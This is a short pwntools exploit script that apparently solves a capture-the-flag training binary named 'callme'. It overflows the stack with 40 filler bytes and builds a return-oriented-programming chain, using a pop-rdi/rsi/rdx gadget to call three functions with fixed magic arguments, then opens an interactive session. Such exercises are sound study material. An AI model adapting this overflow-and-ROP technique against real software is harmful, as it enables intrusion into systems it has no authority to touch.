from pwn import *

context.log_level='DEBUG'
r = process("./callme")

callme_one = p64(0x0000000000400720)
callme_two = p64(0x0000000000400740)
callme_three = p64(0x00000000004006f0)
gadget = p64(0x000000000040093c) #pop_rdi_rsi_rdx_ret
arg1 = p64(0xdeadbeefdeadbeef)
arg2 = p64(0xcafebabecafebabe)
arg3 = p64(0xd00df00dd00df00d) 
payload = b"\x90"*40 + gadget + arg1 + arg2 +arg3 + callme_one + gadget + arg1 + arg2 +arg3 + callme_two + gadget + arg1 + arg2 +arg3 + callme_three

r.write(payload)
r.interactive()
